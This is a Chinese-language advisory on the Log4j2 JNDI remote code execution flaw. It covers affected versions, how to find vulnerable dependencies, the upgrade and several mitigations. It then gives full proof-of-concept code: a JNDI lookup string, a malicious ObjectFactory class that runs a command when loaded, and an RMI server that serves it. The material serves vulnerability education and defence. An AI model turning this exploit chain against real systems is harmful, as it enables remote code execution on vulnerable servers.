# Apache log4j2 远程命令执行漏洞

## 1. 漏洞信息

漏洞软件： Apache Log4j2

漏洞编号：CVE-2021-44228

漏洞描述：Apache Log4j2 远程命令执行

时间：2021-11-26

漏洞详情：https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228

漏洞影响范围版本：2.0.beta9 to 2.14.1



## 2. 排查指导

查看引用了 `log4j-api` 和 `log4j-core` 两个jar包，如maven依赖：

```xml
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-api</artifactId>
            <version>2.14.1</version>
        </dependency>
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-core</artifactId>
            <version>2.14.1</version>
        </dependency>
```

## 3. 修复方案

升级到 2.15.0 版本



## 4. 缓解措施

### 2.10 <= 版本 <= 2.14.1

以下方法任选一种：

1. 添加jvm参数：`-Dlog4j2.formatMsgNoLookups=true`
2. 在应用classpath下添加文件`log4j2.component.properties`，添加配置`log4j2.formatMsgNoLookups=true`
3. 添加系统环境变量 `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`



### 2.0-beta9 <= 版本 < 2.10

在classpath中移除JndiLookup 

```shell
zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
```



参考官网信息：

![官网信息](https://img-blog.csdnimg.cn/7a94b6abe9ff4e69b1063e43e908b2b0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5p2o5bCP54aK55qE56yU6K6w,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)



# 参考信息

[1. Apache Log4j2 官网漏洞信息](https://logging.apache.org/log4j/2.x/security.html)

[2. 缓解措施，环境变量名称应该为LOG4J_FORMAT_MSG_NO_LOOKUPS](https://github.com/apache/logging-log4j2/pull/614)

[3. Apache Log4j2 github地址](https://github.com/apache/logging-log4j2)

[4. 复现代码](https://github.com/YoungBear/log4j2demo)



# 复现代码

## 1. pom依赖

```xml
    <dependencies>
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-api</artifactId>
            <version>2.14.1</version>
        </dependency>
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-core</artifactId>
            <version>2.14.1</version>
        </dependency>
    </dependencies>
```

## 2. 被攻击代码

```java
package com.example.log4j2demo;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4j2Demo {
    private static final Logger LOGGER = LogManager.getLogger(Log4j2Demo.class);


    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.out.println("begin of print log...");

        String logContent = "${jndi:rmi://127.0.0.1:1099/evil}";
        // 模拟另外一台机器运行恶意代码
//        String logContent = "${jndi:rmi://192.168.3.57:1099/evil}";
        LOGGER.error("hello, {}", logContent);
        System.out.println("end of print log...");
    }
}
```



## 2. 恶意代码(以启动计算器为例)

```java
package com.example.log4j2demo;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.Hashtable;

public class EvilObj implements ObjectFactory {

    static {
        System.out.println("begin to run EvilObj static code...");

        try {
            Process p = Runtime.getRuntime().exec(new String[]{"cmd", "/c", "calc.exe"});
            InputStream inputStream = p.getInputStream();
            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }
            p.waitFor();
            inputStream.close();
            reader.close();
            p.destroy();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        System.out.println("getObjectInstance of EvilObj ...");
        return null;
    }

}

```



## 4. RMIServer

```java
package com.example.log4j2demo;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {
    public static void main(String[] args) {
        try {
            LocateRegistry.createRegistry(1099);
            Registry registry = LocateRegistry.getRegistry();
            System.out.println("Create RMI registry on port 1099...");

            String className = "com.example.log4j2demo.EvilObj";
            Reference reference = new Reference(className, className, className);
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            registry.bind("evil", referenceWrapper);
            System.out.println("registry bind ...");

        } catch (Exception e) {
            e.printStackTrace();

        }
    }
}

```

